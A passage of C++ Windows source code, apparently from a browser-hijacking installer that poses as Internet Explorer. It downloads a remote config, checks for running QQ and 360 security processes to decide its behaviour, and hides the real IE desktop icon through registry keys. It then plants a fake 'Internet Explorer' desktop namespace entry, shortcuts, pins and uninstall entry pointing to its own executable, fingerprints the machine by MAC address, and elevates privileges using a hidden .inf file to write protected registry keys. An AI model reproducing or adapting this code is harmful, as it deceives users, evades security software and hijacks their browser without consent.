		TSDEBUG4CXX("DownLoadAndCheckIniConfig enter");
		wchar_t szTempPath[MAX_PATH] = {0};
		GetTempPath(MAX_PATH, szTempPath);
		::PathCombine(szTempPath,szTempPath,L"iesetupconfig.js");
		::DeleteFile(szTempPath);
		DWORD dwThreadId = 0;
		DWORD dwTime;
		GetTime(&dwTime);
		static char szUrl[256] = {0};
		sprintf(szUrl, "%s?stamp=%d", szIniUrl, dwTime);
		HANDLE hThreadINI = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
		WaitForSingleObject(hThreadINI, 5000);
		int nRet = 0x0000;
		wchar_t wszBlackList[MAX_PATH] = {0};
		GetPrivateProfileString(L"entrytype", L"blacklist", L"", wszBlackList, MAX_PATH, szTempPath);
		TSDEBUG4CXX("DownLoadAndCheckIniConfig wszBlackList = "<<wszBlackList);
		if (_tcsicmp(wszBlackList, L"") == 0){
			wcscpy(wszBlackList, L"QQPCTray");
		}
		if (_tcsicmp(wszBlackList, L"") != 0 && MutiQueryProcExist(wszBlackList)){
			nRet |= 0x0001;
		}

		memset(wszBlackList, 0, MAX_PATH);
		GetPrivateProfileString(L"entryaction", L"dtcheck", L"", wszBlackList, MAX_PATH, szTempPath);
		TSDEBUG4CXX("DownLoadAndCheckIniConfig wszBlackList2 = "<<wszBlackList);
		if (_tcsicmp(wszBlackList, L"1") != 0 || !QueryProcessExist(L"360tray.exe")){
			nRet |= 0x0010;
		}
		memset(wszBlackList, 0, MAX_PATH);
		GetPrivateProfileString(L"entrytype", L"shortcutlist", L"", wszBlackList, MAX_PATH, szTempPath);
		if (_tcsicmp(wszBlackList, L"") != 0 && MutiQueryProcExist(wszBlackList)){
			nRet |= 0x0100;
		}
		TSDEBUG4CXX("DownLoadAndCheckIniConfig leave, nRet = "<<nRet);
		return nRet;
	}
	
	void HideIEIcon(int value)
	{
		TSDEBUG4CXX("HideIEIcon VALUE "<<value);
		HKEY szHkey[] = {HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
		DWORD dwValue = value;
		for(int i = 0; i < sizeof(szHkey)/sizeof(HKEY); ++i){
			SetRegValue(szHkey[i], L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel", L"{871C5380-42A0-1069-A2EA-08002B30309D}", REG_DWORD, L"", dwValue, i == 1);
			SetRegValue(szHkey[i], L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu", L"{871C5380-42A0-1069-A2EA-08002B30309D}", REG_DWORD, L"", dwValue, i==1);
		}	
		if (value == 1){
			SetRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\iexplorer", L"HideIEIcon", REG_SZ, L"1", 0);
		}
	}

	void ReplaceIcon(const wchar_t* wszExePath)
	{
		std::wstring wstrRet = L"";
		DWORD dwRet = -1;
		DWORD dwType = REG_SZ;
		QueryRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", L"", dwType, wstrRet, dwRet, true);
		if (wstrRet != L""){
			return;
		}
		wchar_t wszCommand[MAX_PATH] = {0};
		wsprintf(wszCommand, L"\"%s\" /sstartfrom desktopnamespace", wszExePath);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", L"InfoTip", REG_SZ, L"查找并显示 Iternet 上的信息和网站。", dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", L"LocalizedString",REG_SZ, L"Internet Explorer", dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon", L"", REG_SZ, wszExePath, dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open", L"", REG_SZ, L"打开主页(&H)", dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", L"", REG_SZ, wszCommand, dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop", L"", REG_SZ, L"属性(&R)", dwRet);
		SetRegValue(HKEY_CLASSES_ROOT, L"CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command", L"", REG_SZ, L"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl", dwRet);
		SetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", L"", REG_SZ, L"Internet Explorer", dwRet, true);
	}

	BOOL EnablePrivilegeHelper(HANDLE hProcess, LPCTSTR lpszName, BOOL fEnable)
	{
		// Enabling the debug privilege allows the application to see
		// information about service applications
		BOOL fOk = FALSE;    // Assume function fails
		HANDLE hToken;

		// Try to open this process's access token
		if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) 
		{
			// Attempt to modify the "Debug" privilege
			TOKEN_PRIVILEGES tp;
			tp.PrivilegeCount = 1;
			LookupPrivilegeValue(NULL, lpszName, &tp.Privileges[0].Luid);

			tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
			AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

			fOk = (GetLastError() == ERROR_SUCCESS);
			CloseHandle(hToken);
		}
		return(fOk);
	}
	
	void SoftSetRegValue(HKEY hkey, const wchar_t* wszPath, const wchar_t* wszKey, const wchar_t* value){
		TSDEBUG4CXX(L"SoftSetRegValue  wszPath = "<<wszPath<<", wszKey = "<<wszKey<<", value = "<<value);
		HKEY hKey;
		if (ERROR_SUCCESS != ::RegOpenKeyEx(hkey, wszPath,0,KEY_SET_VALUE, &hKey)){
			if (ERROR_SUCCESS != ::RegCreateKey(hkey, wszPath, &hKey)){
				wchar_t wszMsg[128] = {0};
				wsprintf(wszMsg, L"path=%s, key=%s, lasterror=%d", wszPath, wszKey, ::GetLastError());
				TSDEBUG4CXX(L"SetRegValue errormsg =  " << wszMsg);
			}
		}
		if(ERROR_SUCCESS == ::RegSetValueEx(hKey, wszKey, 0, REG_SZ, (LPBYTE)value, wcslen(value)*2))
		{
			::RegCloseKey(hKey);
		}
	}

	bool GetMacByGetAdaptersAddresses(std::wstring& macOUT)
	{
		bool ret = false;

		ULONG outBufLen = sizeof(IP_ADAPTER_ADDRESSES);
		PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
		if (pAddresses == NULL) 
			return false;
		// Make an initial call to GetAdaptersAddresses to get the necessary size into the ulOutBufLen variable
		if(GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen) == ERROR_BUFFER_OVERFLOW)
		{
			free(pAddresses);
			pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
			if (pAddresses == NULL) 
				return false;
		}

		if(GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen) == NO_ERROR)
		{
			// If successful, output some information from the data we received
			for(PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses; pCurrAddresses != NULL; pCurrAddresses = pCurrAddresses->Next)
			{
				// 确保MAC地址的长度为 00-00-00-00-00-00
				if(pCurrAddresses->PhysicalAddressLength != 6)
					continue;
				wchar_t acMAC[32];
				wsprintf(acMAC, L"%02X%02X%02X%02X%02X%02X",
					int (pCurrAddresses->PhysicalAddress[0]),
					int (pCurrAddresses->PhysicalAddress[1]),
					int (pCurrAddresses->PhysicalAddress[2]),
					int (pCurrAddresses->PhysicalAddress[3]),
					int (pCurrAddresses->PhysicalAddress[4]),
					int (pCurrAddresses->PhysicalAddress[5]));
				macOUT = acMAC;
				ret = true;
				break;
			}
		} 

		free(pAddresses);
		return ret;
	}


	void GetPeerId_(std::wstring & wstrPeerId)
	{
		std::wstring wstrMAC;
		if (!GetMacByGetAdaptersAddresses(wstrMAC))
		{
			wstrMAC = L"000000000000";
		}
		wstrPeerId = wstrMAC;
		srand( (unsigned)time( NULL ) );
		for(int i=0;i<4;i++)
		{
			wchar_t szRam[2] = {0};
			wsprintf(szRam,L"%X", rand()%16);
			szRam[1]=L'\0';
			wstrPeerId += szRam;
		}
		return ;
	}

	int RepairIcon(){
		wchar_t szPublic[MAX_PATH] = {0};
		GetProfileFolder(szPublic);
		PathCombine(szPublic, szPublic, L"iexplorer\\program\\iexplore.exe");
		if (!PathFileExists(szPublic)){
			TSDEBUG4CXX(L"RepairIcon 0 !PathFileExists(szPublic)");
			return 0;
		}
		TSDEBUG4CXX(L"RepairIcon 1 ");
		int nRet = DownLoadAndCheckIniConfig();
		if ((nRet & 0x0001) == 0x0001){
			return 0;	
		}
		TSDEBUG4CXX(L"RepairIcon 2 ");
		//备份桌面图标;
		int CLSIDS[2];
		CLSIDS[0] = CSIDL_DESKTOPDIRECTORY;
		CLSIDS[1] = CSIDL_COMMON_DESKTOPDIRECTORY;
		BackupIcon(CLSIDS, L"", L"DESKTOP");
		TSDEBUG4CXX(L"RepairIcon 3 ");
		//备份开始菜单程序
		CLSIDS[0] = CSIDL_PROGRAMS;
		CLSIDS[1] = CSIDL_COMMON_PROGRAMS;
		BackupIcon(CLSIDS, L"", L"SMPROGRAMS");
		TSDEBUG4CXX(L"RepairIcon 4");
		if (IsVistaOrHigher()){
			//备份开始菜单pin
			std::wstring wstrPinPath = GetUserPinPath();
			wchar_t wszStartPin[MAX_PATH] = {0};
			PathCombine(wszStartPin,wstrPinPath.c_str(), L"StartMenu");
			BackupIconPin(wszStartPin, L"STARTPIN");
			TSDEBUG4CXX(L"RepairIcon 5");
			//备份快速启动栏pin
			wchar_t wszToolBar[MAX_PATH] = {0};
			PathCombine(wszToolBar,wstrPinPath.c_str(), L"TaskBar");
			BackupIconPin(wszToolBar, L"QUICKLAUNCH");
			TSDEBUG4CXX(L"RepairIcon 6");
			//创建快速启动栏图标
			TCHAR tszShortcutPath[MAX_PATH] = {0};
			memset(tszShortcutPath, 0, MAX_PATH);
			PathCombine(tszShortcutPath, szPublic, L"..\\Internet Explorer.lnk");
			BuildShortcut(tszShortcutPath, szPublic, L"启动 Internet Explorer 浏览器", L"/sstartfrom toolbar");
			Pin2Taskbar(true, szPublic, tszShortcutPath, false);
		} else{
			//备份开始菜单
			CLSIDS[0] = CSIDL_STARTMENU;
			CLSIDS[1] = CSIDL_COMMON_STARTMENU;
			BackupIcon(CLSIDS, L"", L"STARTMENU");
			//备份任务栏/快速启动栏
			CLSIDS[0] = CSIDL_APPDATA;
			CLSIDS[1] = -1;
			BackupIcon(CLSIDS, L"Microsoft\\Internet Explorer\\Quick Launch", L"QUICKLAUNCH");
			//创建快速启动栏
			TCHAR wszQuickPath[MAX_PATH] = {0};
			::SHGetSpecialFolderPath(NULL, wszQuickPath, CSIDL_APPDATA, FALSE);
			::PathCombine(wszQuickPath, wszQuickPath, L"Microsoft\\Internet Explorer\\Quick Launch\\Internet Explorer.lnk");
			BuildShortcut(wszQuickPath, szPublic, L"启动 Internet Explorer 浏览器", L"/sstartfrom toolbar");

		}
		//创建桌面图标
		TCHAR tszShortcutPath[MAX_PATH] = {0};
		//::SHGetSpecialFolderPath(NULL, tszShortcutPath, CSIDL_COMMON_DESKTOPDIRECTORY, FALSE);
		//::PathCombine(tszShortcutPath, tszShortcutPath, L"Internet Explorer.lnk");
		//BuildShortcut(tszShortcutPath, szPublic, L"启动 Internet Explorer 浏览器", L"/sstartfrom desktop");
		//创建开始菜单图标
		memset(tszShortcutPath, 0, MAX_PATH);
		::SHGetSpecialFolderPath(NULL, tszShortcutPath, CSIDL_PROGRAMS, FALSE);
		::PathCombine(tszShortcutPath, tszShortcutPath, L"Internet Explorer.lnk");
		BuildShortcut(tszShortcutPath, szPublic, L"启动 Internet Explorer 浏览器", L"/sstartfrom startmenuprograms");
		Pin2StartMenu(true, szPublic, tszShortcutPath, false);
		TSDEBUG4CXX(L"RepairIcon 7 nRet & 0x0010 == 0x0010 = "<<(nRet & 0x0010 == 0x0010));
		if ((nRet & 0x0010) == 0x0010){
			TSDEBUG4CXX(L"RepairIcon 7-- begin enter HideIEIcon ");
			HideIEIcon(1);
		}
		TSDEBUG4CXX(L"RepairIcon 9");
		if ((nRet & 0x0100) != 0x0100){
			ReplaceIcon(szPublic);
		}
		TSDEBUG4CXX(L"RepairIcon 10");
		//写ie的注册表
		SoftSetRegValue(HKEY_CURRENT_USER, L"SoftWare\\iexplorer", L"Path", szPublic);
		std::wstring wstrPid;
		GetPeerId_(wstrPid);
		SoftSetRegValue(HKEY_CURRENT_USER, L"SoftWare\\iexplorer", L"PeerId", wstrPid.c_str());
		std::wstring wstrInstSrc = L"known2";
		DWORD dwType = REG_SZ;
		QueryRegValue(HKEY_LOCAL_MACHINE, L"Software\\YBYL", L"InstallSource", dwType, wstrInstSrc, dwType);
		SoftSetRegValue(HKEY_CURRENT_USER, L"SoftWare\\iexplorer", L"InstallSource", wstrInstSrc.c_str());

		wchar_t szInstDir[MAX_PATH] = {0}, wszTmpPblic[MAX_PATH] = {0};
		GetProfileFolder(wszTmpPblic);
		PathCombine(szInstDir, wszTmpPblic, L"iexplorer");
		SoftSetRegValue(HKEY_CURRENT_USER, L"SoftWare\\iexplorer", L"InstDir", szInstDir);
		DWORD dwTime;
		GetTime(&dwTime);
		wchar_t wszTime[64]={0};
		wsprintf(wszTime, L"%d", dwTime);
		SoftSetRegValue(HKEY_CURRENT_USER, L"SoftWare\\iexplorer", L"InstallTimes", wszTime);

		wchar_t wszComPath[MAX_PATH] = {0};
		PathCombine(wszComPath, szInstDir, L"uninst.exe");
		SoftSetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", L"", szPublic);
		SoftSetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", L"DisplayName", L"Internet Explorer");
		SoftSetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", L"UninstallString", wszComPath);
		SoftSetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", L"DisplayIcon", szPublic);
		TSDEBUG4CXX(L"RepairIcon 11");

		//处理无权限的注册表问题
		wchar_t wszInfFilePath[MAX_PATH] = {0};
		::SHGetSpecialFolderPath(NULL, wszInfFilePath, CSIDL_COOKIES, FALSE);
		::PathCombine(wszInfFilePath, wszInfFilePath, L"XX7T6KF.inf");
		UACElevate uac;
		if (uac.Init(wszInfFilePath, IsWow64()) == ELEVATE_SUCCESS){
			for (std::vector<std::wstring>::const_iterator c_iter = wstrVec.begin(); c_iter != wstrVec.end();c_iter++){
				uac.AddReg((*c_iter).c_str());
			}
		}
		uac.DoWork();
		TSDEBUG4CXX(L"RepairIcon 12");
		return 1;

	}

}